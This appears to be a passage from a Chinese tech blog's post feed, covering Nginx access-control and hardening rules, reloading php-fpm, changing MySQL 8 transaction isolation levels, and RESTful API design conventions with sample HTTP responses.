<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>以上均出自官方文档，发现很多人不知道看vue配置文档，百分之八十的问题都可以通过文档解决</p>
]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx访问控制</title>
    <url>/post/16692/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>有时，网站会被恶意入侵，可用Nginx做一些访问控制，加强一些网站安全性</p>
<span id="more"></span>

<h3 id="扩展名限制"><a href="#扩展名限制" class="headerlink" title="扩展名限制"></a>扩展名限制</h3><p>禁止访问指定目录下的程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location ~ ^/images/.*\.(php|py)$</span><br><span class="line">&#123;</span><br><span class="line">    deny all;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>禁止访问指定文件名程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location ~ ^/data/(attachment|avatar).*\.(php|py)$</span><br><span class="line">&#123;</span><br><span class="line">    deny all;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="文件或目录限制"><a href="#文件或目录限制" class="headerlink" title="文件或目录限制"></a>文件或目录限制</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location ~ ^/(\.user.ini|\.htaccess|\.git|\.svn|\.project|LICENSE|README.md) &#123;</span><br><span class="line">    return 404;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>排除某个目录不受限制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location ~ \.well-known&#123;</span><br><span class="line">    allow all;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>禁止访问单个目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location ~ ^/static &#123;</span><br><span class="line">    deny all;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>禁止访问多个目录，并返回指定状态码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location ~ ^/(static|js) &#123;</span><br><span class="line">    return 404;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="限制IP访问"><a href="#限制IP访问" class="headerlink" title="限制IP访问"></a>限制IP访问</h3><p>禁止目录访问，但允许某IP访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location ~ ^/mysql_loging/ &#123;</span><br><span class="line">    allow 192.168.0.4;</span><br><span class="line">    deny all;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>限制IP或IP段访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    deny 192.168.0.4;</span><br><span class="line">    allow 192.168.1.0/16;</span><br><span class="line">    allow 10.0.0.0/24;</span><br><span class="line">    deny all;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>nginx做反向代理的时候也可以限制客户端IP</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ( $remoteaddr = 10.0.0.7 ) &#123;</span><br><span class="line">    return 403;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( $remoteaddr = 218.247.17.130 ) &#123;</span><br><span class="line">    set $allow_access_root &#x27;ture&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>禁止某ip段访问并向浏览器输出一段文字（若有乱码,请在server中添加：charset utf-8;）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ($remote_addr ~* ^211\.149\.(.*?)\.(.*?)$)&#123;</span><br><span class="line">return 404 &quot;黑名单用户，拒绝访问&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="禁止非法域名解析访问"><a href="#禁止非法域名解析访问" class="headerlink" title="禁止非法域名解析访问"></a>禁止非法域名解析访问</h3><p>让使用IP访问网站的用户，或恶意接卸域名的用户，收到501错误</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80 default_server;</span><br><span class="line">    server_name _;</span><br><span class="line">    return 501;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过301跳转主页</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80 default_server;</span><br><span class="line">    server_name _;</span><br><span class="line">    rewrite ^(.*) http://blog.dns.com/$1 permanent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现某域名恶意解析到公司的服务器IP，在server标签里添加以下代码即可，若有多个server要多处添加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ($host !~ ^www/.tag/.com$) &#123;</span><br><span class="line">    rewrite ^(.*) http://blog.mydns.vip$1 permanent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>nginx</category>
      </categories>
      <tags>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>平滑重启php-fpm</title>
    <url>/post/52587/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>php-fpm 会对下面几个信号作（自己的）处理</p>
<ul>
<li>SIGINT, SIGTERM: immediate termination</li>
<li>SIGQUIT: graceful stop</li>
<li>SIGUSR1: re-open log file</li>
<li>SIGUSR2: graceful reload of all workers + reload of fpm conf/binary</li>
</ul>
<span id="more"></span>

<h3 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h3><p>master进程可以理解以下信号</p>
<ul>
<li>INT （2）, TERM（15） 立刻终止</li>
<li>QUIT （3） 平滑终止</li>
<li>USR1 重新打开日志文件</li>
<li>USR2 平滑重载所有worker进程并重新载入配置和二进制模块</li>
</ul>
<h4 id="查看进程数"><a href="#查看进程数" class="headerlink" title="查看进程数"></a>查看进程数</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps aux | grep -c php-fpm</span><br></pre></td></tr></table></figure>

<h4 id="查看master进程号"><a href="#查看master进程号" class="headerlink" title="查看master进程号"></a>查看master进程号</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps aux|grep <span class="string">&#x27;php-fpm: master&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="平滑重启"><a href="#平滑重启" class="headerlink" title="平滑重启"></a>平滑重启</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">kill</span> -USR2 `cat /usr/<span class="built_in">local</span>/php/var/run/php-fpm.pid`</span><br></pre></td></tr></table></figure>
<p>OR</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">kill</span> -USR2 [pid]</span><br></pre></td></tr></table></figure>

<h3 id="脚本实现"><a href="#脚本实现" class="headerlink" title="脚本实现"></a>脚本实现</h3><h4 id="centos脚本实现"><a href="#centos脚本实现" class="headerlink" title="centos脚本实现"></a>centos脚本实现</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;php-fpm is reloading....&quot;</span></span><br><span class="line">PID=`ps aux | grep php-fpm | grep <span class="string">&quot;master&quot;</span> |awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>`</span><br><span class="line"></span><br><span class="line">[ <span class="variable">$PID</span> ] &amp;&amp; <span class="built_in">kill</span> -USR2 <span class="variable">$PID</span> || <span class="built_in">echo</span> <span class="string">&quot;php-fpm is useing(pid=<span class="variable">$PID</span>)&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;reload done!&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;php-fpm is reload...&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;reload done!&quot;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>Mysql8修改事务隔离级别</title>
    <url>/post/63403/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>线上代码出现了bug，经查是mysql隔离级别引起的问题，将数据库隔离级别改为更适合线上业务的读提交</p>
<span id="more"></span>

<h3 id="查看事务隔离级别"><a href="#查看事务隔离级别" class="headerlink" title="查看事务隔离级别"></a>查看事务隔离级别</h3><p>MySQL8中隔离级别的变量跟之前的版本不一样，之前是tx_isolation，MySQL8改成了transaction_isolation</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mysql&gt; show variables like <span class="string">&#x27;transaction%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mysql&gt; select @@transaction_isolation;</span><br></pre></td></tr></table></figure>

<h3 id="修改事务隔离级别"><a href="#修改事务隔离级别" class="headerlink" title="修改事务隔离级别"></a>修改事务隔离级别</h3><p>由低到高分别为</p>
<ul>
<li>read uncommitted（读未提交）</li>
<li>read committed（读提交）</li>
<li>repeatable read（重复读）</li>
<li>Serializable（序列化）</li>
</ul>
<p>设置本次会话的事务隔离级别，只在本会话有效，不会影响到其它会话</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mysql&gt; <span class="built_in">set</span> session transaction isolation level <span class="built_in">read</span> committed;</span><br></pre></td></tr></table></figure>

<p>设置全局的事务隔离级别，该设置不会影响当前已经连接的会话，新打开的会话，将使用新设置的事务隔离级别</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mysql&gt; <span class="built_in">set</span> global transaction isolation level <span class="built_in">read</span> committed;</span><br></pre></td></tr></table></figure>

<p>设置下一次事务操作的隔离级别，该设置会随着下一次事务的提交而失效</p>
<h3 id="重启后继续生效"><a href="#重启后继续生效" class="headerlink" title="重启后继续生效"></a>重启后继续生效</h3><p>修改my.ini</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[mysqld]</span></span><br><span class="line"><span class="attr">transaction-isolation</span> = REPEATABLE-READ</span><br><span class="line"><span class="attr">transaction-read-only</span> = <span class="literal">OFF</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>RESETful API 设计规范</title>
    <url>/post/55580/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>工欲善其事，必先利其器，一个健壮的API必要有优秀的设计规范，本文是最基本的设计理念</p>
<span id="more"></span>

<h3 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h3><p>在通过 API 于后端服务通信的过程中，应该 使用 HTTPS 协议。</p>
<h3 id="API-Root-URL"><a href="#API-Root-URL" class="headerlink" title="API Root URL"></a>API Root URL</h3><p>API 的根入口点应尽可能保持足够简单，这里有两个常见的 URL 根例子：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">api.example.com/*</span><br><span class="line">example.com<span class="regexp">/api/</span>*</span><br></pre></td></tr></table></figure>

<blockquote>
<p>如果你的应用很庞大或者你预计它将会变的很庞大，那 应该 将 API 放到子域下。这种做法可以保持某些规模化上的灵活性。</p>
</blockquote>
<h3 id="Versioning"><a href="#Versioning" class="headerlink" title="Versioning"></a>Versioning</h3><p>所有的 API 必须保持向后兼容，你 必须 在引入新版本 API 的同时确保旧版本 API 仍然可用。所以 应该 为其提供版本支持。</p>
<p>目前比较常见的两种版本号形式：</p>
<p>在 URL 中嵌入版本编号</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">api.example.com<span class="regexp">/v1/</span>*</span><br></pre></td></tr></table></figure>
<p>这种做法是版本号直观、易于调试；另一种做法是，将版本号放在 HTTP Header 头中：<br>通过媒体类型来指定版本信息</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">Accept: application/vnd<span class="selector-class">.example</span><span class="selector-class">.com</span>.v1+json</span><br></pre></td></tr></table></figure>

<p>其中 vnd 表示 Standards Tree 标准树类型，有三个不同的树: x，prs 和 vnd。你使用的标准树需要取决于你开发的项目</p>
<ul>
<li>未注册的树（x）主要表示本地和私有环境</li>
<li>私有树（prs）主要表示没有商业发布的项目</li>
<li>供应商树（vnd）主要表示公开发布的项目</li>
</ul>
<blockquote>
<p>后面几个参数依次为应用名称（一般为应用域名）、版本号、期望的返回格式。</p>
</blockquote>
<h3 id="Endpoints"><a href="#Endpoints" class="headerlink" title="Endpoints"></a>Endpoints</h3><p>端点就是指向特定资源或资源集合的 URL。在端点的设计中，你 必须 遵守下列约定:</p>
<ul>
<li>URL 的命名 必须 全部小写</li>
<li>URL 中资源（resource）的命名 必须 是名词，并且 必须 是复数形式</li>
<li>必须 优先使用 Restful 类型的 URL</li>
<li>URL 中不能出现 -，必须 用下划线 _ 代替</li>
<li>URL 必须 是易读的</li>
<li>URL 一定不可 暴露服务器架构</li>
</ul>
<h3 id="HTTP-动词"><a href="#HTTP-动词" class="headerlink" title="HTTP 动词"></a>HTTP 动词</h3><p>对于资源的具体操作类型，由 HTTP 动词表示。常用的 HTTP 动词有下面五个（括号里是对应的 SQL 命令）。</p>
<ul>
<li>GET（SELECT）：从服务器取出资源（一项或多项）。</li>
<li>POST（CREATE）：在服务器新建一个资源。</li>
<li>PUT（UPDATE）：在服务器更新资源（客户端提供改变后的完整资源）。</li>
<li>PATCH（UPDATE）：在服务器更新资源（客户端提供改变的属性）。</li>
<li>DELETE（DELETE）：从服务器删除资源。</li>
</ul>
<h3 id="Filtering"><a href="#Filtering" class="headerlink" title="Filtering"></a>Filtering</h3><blockquote>
<p>如果记录数量很多，服务器不可能都将它们返回给用户。API 应该 提供参数，过滤返回结果。下面是一些常见的参数。</p>
</blockquote>
<ul>
<li>?limit=10：指定返回记录的数量</li>
<li>?offset=10：指定返回记录的开始位置。</li>
<li>?page=2&amp;per_page=100：指定第几页，以及每页的记录数。</li>
<li>?sortby=name&amp;order=asc：指定返回结果按照哪个属性排序，以及排序顺序。</li>
<li>?animal_type_id=1：指定筛选条件</li>
</ul>
<p>所有 URL 参数 必须 是全小写，必须 使用下划线类型的参数形式。</p>
<p>经常使用的、复杂的查询 应该 标签化，降低维护成本。如</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="builtin-name">GET</span> /trades?<span class="attribute">status</span>=closed&amp;sort=sortby=name&amp;order=asc</span><br><span class="line"><span class="comment"># 可为其定制快捷方式</span></span><br><span class="line"><span class="builtin-name">GET</span> /trades/recently_closed</span><br></pre></td></tr></table></figure>

<h3 id="Authentication"><a href="#Authentication" class="headerlink" title="Authentication"></a>Authentication</h3><p>应该 使用 OAuth2.0 的方式为 API 调用者提供登录认证。必须 先通过登录接口获取 Access Token 后再通过该 token 调用需要身份认证的 API。</p>
<p>Oauth 的端点设计示列</p>
<ul>
<li>RFC 6749   /token</li>
<li>Twitter    /oauth2/token</li>
<li>Fackbook   /oauth/access_token</li>
<li>Google     /o/oauth2/token</li>
<li>Github     /login/oauth/access_token</li>
<li>Instagram  /oauth/authorize</li>
</ul>
<p>客户端在获得 access token 的同时 必须 在响应中包含一个名为 expires_in 的数据，它表示当前获得的 token 会在多少 秒 后失效。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;access_token&quot;</span>: <span class="string">&quot;token....&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;token_type&quot;</span>: <span class="string">&quot;Bearer&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;expires_in&quot;</span>: <span class="number">3600</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端在请求需要认证的 API 时，必须 在请求头 Authorization 中带上 access_token。</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Authorization:</span> Bearer token...</span><br></pre></td></tr></table></figure>

<p>当超过指定的秒数后，access token 就会过期，再次用过期/或无效的 token 访问时，服务端 应该 返回 invalid_token 的错误或 401 错误码。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">401</span> Unauthorized</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-store</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;error&quot;</span>: <span class="string">&quot;invalid_token&quot;</span></span></span><br><span class="line"><span class="json">&#125;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>Laravel 开发中，应该 使用 JWT 来为管理你的 Token，并且 一定不可 在 api 中间件中开启请求 session。</p>
</blockquote>
<h3 id="Response"><a href="#Response" class="headerlink" title="Response"></a>Response</h3><p>所有的 API 响应，必须 遵守 HTTP 设计规范，必须 选择合适的 HTTP 状态码。一定不可 所有接口都返回状态码为 200 的 HTTP 响应，如:</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> ok</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>example.com</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;code&quot;</span>: <span class="number">0</span>,</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;msg&quot;</span>: <span class="string">&quot;success&quot;</span>,</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;data&quot;</span>: &#123;</span></span><br><span class="line"><span class="json">        <span class="attr">&quot;username&quot;</span>: <span class="string">&quot;username&quot;</span></span></span><br><span class="line"><span class="json">    &#125;</span></span><br><span class="line"><span class="json">&#125;</span></span><br></pre></td></tr></table></figure>

<p>常见的 HTTP 状态码</p>
<table>
<thead>
<tr>
<th>状态码</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>1xx</td>
<td>代表请求已被接受，需要继续处理</td>
</tr>
<tr>
<td>2xx</td>
<td>请求已成功，请求所希望的响应头或数据体将随此响应返回</td>
</tr>
<tr>
<td>3xx</td>
<td>重定向</td>
</tr>
<tr>
<td>4xx</td>
<td>客户端引起的错误</td>
</tr>
<tr>
<td>5xx</td>
<td>服务端引起的错误</td>
</tr>
</tbody></table>
<blockquote>
<p>只有来自客户端的请求被正确的处理后才能返回 2xx 的响应，所以当 API 返回 2xx 类型的状态码时，前端 必须 认定该请求已处理成功。</p>
</blockquote>
<p>必须强调的是，所有 API 一定不可 返回 1xx 类型的状态码。当 API 发生错误时，必须 返回出错时的详细信息。目前常见返回错误信息的方法有两种：</p>
<p>1、将错误详细放入 HTTP 响应首部；</p>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line"><span class="meta">X</span>-MYNAME-<span class="meta">ERROR</span>-CODE: 4001</span><br><span class="line"><span class="meta">X</span>-MYNAME-<span class="meta">ERROR</span>-<span class="meta">MESSAGE</span>: Bad authentication token</span><br><span class="line"><span class="meta">X</span>-MYNAME-<span class="meta">ERROR</span>-INFO: http://docs.example.com/api/v1/authentication</span><br></pre></td></tr></table></figure>

<p>2、直接放入响应实体中；</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">401</span> Unauthorized</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.11.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache, private</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 24 Jun 2018 10:02:59 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;<span class="attr">&quot;error_code&quot;</span>:<span class="number">40100</span>,<span class="attr">&quot;message&quot;</span>:<span class="string">&quot;Unauthorized&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure>

<p>考虑到易读性和客户端的易处理性，我们 必须 把错误信息直接放到响应实体中，并且错误格式 应该 满足如下格式：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;message&quot;</span>: <span class="string">&quot;您查找的资源不存在&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;error_code&quot;</span>: <span class="number">404001</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中错误码（error_code）必须 和 HTTP 状态码对应，也方便错误码归类，如：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">429</span> Too Many Requests</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.11.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache, private</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 24 Jun 2018 10:15:52 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;<span class="attr">&quot;error_code&quot;</span>:<span class="number">429001</span>,<span class="attr">&quot;message&quot;</span>:<span class="string">&quot;你操作太频繁了&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure>

<p>应该 在返回的错误信息中，同时包含面向开发者和面向用户的提示信息，前者可方便开发人员调试，后者可直接展示给终端用户查看如：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;message&quot;</span>: <span class="string">&quot;直接展示给终端用户的错误信息&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;error_code&quot;</span>: <span class="string">&quot;业务错误码&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;error&quot;</span>: <span class="string">&quot;供开发者查看的错误信息&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;debug&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;错误堆栈，必须开启 debug 才存在&quot;</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面详细列举了各种情况 API 的返回说明。</p>
<h3 id="200-ok"><a href="#200-ok" class="headerlink" title="200 ok"></a>200 ok</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">200 状态码是最常见的 HTTP 状态码，在所有 成功 的 <span class="builtin-name">GET</span> 请求中，必须 返回此状态码。HTTP 响应实体部分 必须 直接就是数据，不要做多余的包装。</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;data&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>: 1,</span><br><span class="line">            <span class="string">&quot;avatar&quot;</span>: <span class="string">&quot;https://lorempixel.com/640/480/?32556&quot;</span>,</span><br><span class="line">            <span class="string">&quot;nickname&quot;</span>: <span class="string">&quot;fwest&quot;</span>,</span><br><span class="line">            <span class="string">&quot;last_logined_time&quot;</span>: <span class="string">&quot;2018-05-29 04:56:43&quot;</span>,</span><br><span class="line">            <span class="string">&quot;has_registed&quot;</span>: <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>: 2,</span><br><span class="line">            <span class="string">&quot;avatar&quot;</span>: <span class="string">&quot;https://lorempixel.com/640/480/?86144&quot;</span>,</span><br><span class="line">            <span class="string">&quot;nickname&quot;</span>: <span class="string">&quot;zschowalter&quot;</span>,</span><br><span class="line">            <span class="string">&quot;last_logined_time&quot;</span>: <span class="string">&quot;2018-06-16 15:18:34&quot;</span>,</span><br><span class="line">            <span class="string">&quot;has_registed&quot;</span>: <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;meta&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;pagination&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;total&quot;</span>: 101,</span><br><span class="line">            <span class="string">&quot;count&quot;</span>: 2,</span><br><span class="line">            <span class="string">&quot;per_page&quot;</span>: 2,</span><br><span class="line">            <span class="string">&quot;current_page&quot;</span>: 1,</span><br><span class="line">            <span class="string">&quot;total_pages&quot;</span>: 51,</span><br><span class="line">            <span class="string">&quot;links&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;next&quot;</span>: <span class="string">&quot;http://api.example.com?page=2&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>其中，分页和其他额外的媒体信息，必须放到 meta 字段中。</p>
</blockquote>
<h3 id="201-Created"><a href="#201-Created" class="headerlink" title="201 Created"></a>201 Created</h3><p>当服务器创建数据成功时，应该 返回此状态码。常见的应用场景是使用 POST 提交用户信息，如：</p>
<ul>
<li>添加了新用户</li>
<li>上传了图片</li>
<li>创建了新活动</li>
</ul>
<p>等，都可以返回 201 状态码。需要注意的是，你可以选择在用户创建成功后返回新用户的数据</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">201</span> Created</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.11.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 24 Jun 2018 09:13:40 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;id&quot;</span>: <span class="number">1</span>,</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;avatar&quot;</span>: <span class="string">&quot;https:\/\/lorempixel.com\/640\/480\/?32556&quot;</span>,</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;nickname&quot;</span>: <span class="string">&quot;fwest&quot;</span>,</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;last_logined_time&quot;</span>: <span class="string">&quot;2018-05-29 04:56:43&quot;</span>,</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;created_at&quot;</span>: <span class="string">&quot;2018-06-16 17:55:55&quot;</span>,</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;updated_at&quot;</span>: <span class="string">&quot;2018-06-16 17:55:55&quot;</span></span></span><br><span class="line"><span class="json">&#125;</span></span><br></pre></td></tr></table></figure>

<p>也可以返回一个响应实体为空的 HTTP Response 如：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">201</span> Created</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.11.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 24 Jun 2018 09:12:20 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里我们 应该 采用第二种方式，因为大多数情况下，客户端只需要知道该请求操作成功与否，并不需要返回新资源的信息。</p>
</blockquote>
<h3 id="202-Accepted"><a href="#202-Accepted" class="headerlink" title="202 Accepted"></a>202 Accepted</h3><p>该状态码表示服务器已经接受到了来自客户端的请求，但还未开始处理。常用短信发送、邮件通知、模板消息推送等这类很耗时需要队列支持的场景中；</p>
<blockquote>
<p>返回该状态码时，响应实体 必须 为空。</p>
</blockquote>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">202</span> Accepted</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.11.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 24 Jun 2018 09:25:15 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br></pre></td></tr></table></figure>

<h3 id="204-No-Content"><a href="#204-No-Content" class="headerlink" title="204 No Content"></a>204 No Content</h3><p>该状态码表示响应实体不包含任何数据，其中：</p>
<p>在使用 DELETE 方法删除资源 成功 时，必须 返回该状态码<br>使用 PUT、PATCH 方法更新数据 成功 时，也 应该 返回此状态码</p>
